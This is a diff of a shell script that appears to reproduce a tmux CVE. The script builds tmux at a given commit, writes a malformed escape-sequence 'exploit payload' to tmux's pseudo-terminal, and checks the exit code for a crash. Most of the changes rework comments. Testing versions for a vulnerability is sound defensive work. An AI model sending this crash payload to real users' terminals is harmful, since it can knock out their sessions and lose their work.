@@ -11,16 +11,16 @@ run_tmux_test() {
   local commit_hash="$1"
   local version_description="$2"
   local expected_outcome="$3"
-  local timeout_duration="${4:-60}" # Default to 60 seconds if not provided
+  local timeout_duration="${4:-60}" # Default: 60 seconds
 
   echo "=========================================="
   echo "Testing ${version_description} (${commit_hash})"
   echo "=========================================="
 
-  # Reset to the specified version
+  # reset to the specified version
   git reset --hard "${commit_hash}"
 
-  # Build tmux from source
+  # build tmux from source
   echo "Building tmux from source..."
   sh autogen.sh && ./configure && make
   echo "Build complete."
@@ -28,41 +28,46 @@ run_tmux_test() {
   echo -e "\n--- Running ${version_description} and attempting to trigger CVE ---"
   echo "${expected_outcome}"
 
-  # Execute tmux in the background + get its PID
+  # execute tmux in the background + get its PID
   ./tmux &
   TMUX_PID=$!
   echo "tmux started with PID: $TMUX_PID"
   sleep 2 # Wait for tmux to start
 
-  # Send exploit payload to tmux
-  # This method writes directly to the pseudo-terminal, simulating program output.
+  # send exploit payload to tmux
   echo -e '\033[::::::7::1:2:3::5:6:7:m' >"/dev/pts/$(tmux list-panes -F '#{pane_tty}' | grep -oP '\d+$' | head -n 1)"
   sleep 1
 
   echo -e "\n--- Payload sent. Waiting for tmux process with timeout of ${timeout_duration}s ---"
 
-  # Wait for tmux to finish, with a timeout
-  # Run a subshell that sleeps for $timeout_duration seconds
-  # and then kills tmux if it's still running.
-  (sleep "$timeout_duration" && kill "$TMUX_PID" 2>/dev/null && echo "tmux (PID: $TMUX_PID) timed out and was killed.") &
+  # in order to wait for tmux to finish, with a timeout we run a subshell
+  # that sleeps for $timeout_duration seconds, and then kills tmux if it's still running
+  (
+    sleep "$timeout_duration" &&
+      kill "$TMUX_PID" 2>/dev/null &&
+      echo "tmux (PID: $TMUX_PID) timed out and was killed."
+  ) &
   TIMEOUT_MONITOR_PID=$!
 
   # Wait for the TMUX_PID to exit
   wait "$TMUX_PID" 2>/dev/null
   TMUX_EXIT_CODE=$?
 
-  # Kill the timeout monitor if tmux exited before the timeout
-  # Also, ensure the monitor PID is valid before trying to kill.
+  # kill the timeout monitor if tmux exited before the timeout
   if ps -p "$TIMEOUT_MONITOR_PID" >/dev/null 2>&1; then # Check if TIMEOUT_MONITOR_PID is running
     kill "$TIMEOUT_MONITOR_PID" 2>/dev/null
     wait "$TIMEOUT_MONITOR_PID" 2>/dev/null # Clean up the timeout monitor process
   fi
 
+  # check the exit code of tmux in oreder to determine if it crashed or not
   if [ "$TMUX_EXIT_CODE" -eq 0 ]; then
     echo "tmux (PID: $TMUX_PID) exited cleanly."
-  elif [ "$TMUX_EXIT_CODE" -eq 124 ]; then # Exit code for timeout from `timeout` command (alternative)
+  elif [ "$TMUX_EXIT_CODE" -eq 124 ]; then
+    # Exit code for timeout from `timeout` command (alternative)
     echo "tmux (PID: $TMUX_PID) was killed due to timeout."
-  elif [ "$TMUX_EXIT_CODE" -gt 128 ]; then # Processes killed by signals have exit codes > 128
+  elif [ "$TMUX_EXIT_CODE" -gt 128 ]; then
+    # Processes killed by signals have exit codes > 128
+
     # Signal number is exit code - 128. SIGKILL is 9, so exit code is 137. SIGTERM is 15 (143)
     SIGNAL_NUMBER=$((TMUX_EXIT_CODE - 128))
     if [ "$SIGNAL_NUMBER" -eq 9 ]; then # SIGKILL
